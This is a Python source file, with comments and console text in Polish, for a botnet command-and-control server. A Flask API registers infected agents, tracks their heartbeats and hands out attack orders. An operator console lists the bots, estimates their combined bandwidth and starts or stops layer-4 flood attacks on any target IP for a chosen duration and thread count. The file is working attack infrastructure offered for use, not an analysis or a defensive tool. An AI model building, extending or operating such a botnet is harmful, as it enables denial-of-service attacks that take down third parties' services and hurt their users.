import os
import sys
import threading
import time
import json
from datetime import datetime, timedelta
from flask import Flask, request, jsonify

app = Flask(__name__)

# Prosty słownik w pamięci (nie potrzebuje bazy danych!)
agents = {}  # {agent_id: {'last_seen': time, 'ip': '...', 'hostname': '...'}}
current_attack = None  # {'target': '1.1.1.1', 'threads': 100, 'duration': 300, 'start_time': timestamp}

# ============ API DLA AGENTÓW ============

@app.route('/api/register', methods=['POST'])
def register():
    """Agent się rejestruje"""
    data = request.json
    agent_id = data['id']
    
    agents[agent_id] = {
        'last_seen': time.time(),
        'ip': data.get('ip', 'unknown'),
        'hostname': data.get('hostname', 'unknown'),
        'platform': data.get('platform', 'unknown'),
        'attacking': False
    }
    print(f"[+] Nowy agent: {agent_id} z {data.get('ip')}")
    return jsonify({'status': 'ok'})

@app.route('/api/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    """Agent wysyła sygnał życia"""
    if agent_id in agents:
        agents[agent_id]['last_seen'] = time.time()
        agents[agent_id]['attacking'] = request.json.get('attacking', False)
    return jsonify({'status': 'ok'})

@app.route('/api/orders/<agent_id>')
def get_orders(agent_id):
    """Agent pyta co ma robić"""
    if current_attack and time.time() - current_attack['start_time'] < current_attack['duration']:
        # Atak trwa
        return jsonify({
            'target_ip': current_attack['target'],
            'threads': current_attack['threads'],
            'duration': current_attack['duration']
        })
    else:
        # Brak ataku lub atak się zakończył
        return jsonify({'stop': True})

# ============ KONSOLA KONTROLNA ============

def print_help():
    """Wyświetla pomoc"""
    print("""
╔══════════════════════════════════════════════════════════╗
║                     BOTNET CONSOLE                       ║
╠══════════════════════════════════════════════════════════╣
║ l4 <IP> <czas> <wątki>  - Rozpocznij atak L4            ║
║                         np. l4 192.168.1.100 60 100     ║
║                                                          ║
║ stop                     - Zatrzymaj atak               ║
║                                                          ║
║ list                     - Pokaż aktywnych agentów       ║
║                                                          ║
║ stats                    - Pokaż statystyki             ║
║                                                          ║
║ help                     - Ta pomoc                     ║
║                                                          ║
║ exit                     - Wyjście                      ║
╚══════════════════════════════════════════════════════════╝
""")

def print_agents():
    """Wyświetla listę agentów"""
    now = time.time()
    online = []
    offline = []
    
    for aid, data in agents.items():
        if now - data['last_seen'] < 60:  # online w ostatniej minucie
            online.append(aid)
        else:
            offline.append(aid)
    
    print(f"\n🤖 ONLINE ({len(online)}):")
    for aid in online[:10]:  # pokaż max 10
        agent = agents[aid]
        status = "🔥 ATAKUJE" if agent['attacking'] else "💤"
        print(f"  [{aid}] {agent['hostname']} ({agent['ip']}) - {status}")
    
    if offline:
        print(f"\n💀 OFFLINE ({len(offline)}):")
        for aid in offline[:5]:
            print(f"  [{aid}] ostatnio: {int(now - agents[aid]['last_seen'])}s temu")

def print_stats():
    """Wyświetla statystyki"""
    now = time.time()
    total = len(agents)
    online = sum(1 for a in agents.values() if now - a['last_seen'] < 60)
    attacking = sum(1 for a in agents.values() if a.get('attacking', False))
    
    print(f"""
╔════════════════════════════════════╗
║           STATYSTYKI               ║
╠════════════════════════════════════╣
║  Wszystkie boty: {total:<4}                      ║
║  Online:         {online:<4}                      ║
║  Atakuje:        {attacking:<4}                      ║
║  Moc:            {online * 100} Mbps              ║
╚════════════════════════════════════╝
""")
    
    if current_attack and time.time() - current_attack['start_time'] < current_attack['duration']:
        remaining = current_attack['duration'] - (time.time() - current_attack['start_time'])
        print(f"🔥 ATAK TRWA: {current_attack['target']} | pozostało: {int(remaining)}s")

def console():
    """Główna pętla konsoli"""
    print("\n" + "="*50)
    print("           BOTNET C2 - KONSOLA ZARZĄDZANIA")
    print("="*50)
    print_help()
    
    global current_attack
    
    while True:
        try:
            cmd = input("\nC2> ").strip().lower()
            
            if cmd == 'help':
                print_help()
            
            elif cmd == 'list':
                print_agents()
            
            elif cmd == 'stats':
                print_stats()
            
            elif cmd == 'stop':
                current_attack = None
                print("[✓] Atak zatrzymany")
            
            elif cmd.startswith('l4 '):
                parts = cmd.split()
                if len(parts) == 4:
                    try:
                        ip = parts[1]
                        duration = int(parts[2])
                        threads = int(parts[3])
                        
                        current_attack = {
                            'target': ip,
                            'duration': duration,
                            'threads': threads,
                            'start_time': time.time()
                        }
                        
                        print(f"[✓] Atak rozpoczęty!")
                        print(f"    Cel: {ip}")
                        print(f"    Czas: {duration}s")
                        print(f"    Wątki: {threads}")
                        print(f"    Boty online: {sum(1 for a in agents.values() if time.time() - a['last_seen'] < 60)}")
                        
                    except ValueError:
                        print("[!] Błąd: czas i wątki muszą być liczbami")
                else:
                    print("[!] Użycie: l4 <IP> <czas> <wątki>")
            
            elif cmd == 'exit':
                print("Do widzenia!")
                break
            
            elif cmd:
                print(f"[!] Nieznana komenda: {cmd}")
                
        except KeyboardInterrupt:
            print("\nDo widzenia!")
            break
        except Exception as e:
            print(f"[!] Błąd: {e}")

# ============ URUCHOMIENIE ============

def run_flask():
    """Uruchamia serwer Flask w tle"""
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

if __name__ == '__main__':
    # Uruchom Flask w osobnym wątku
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    print("[✓] Serwer API uruchomiony")
    print("[✓] Czekam na agentów...")
    
    # Uruchom konsolę
    console()
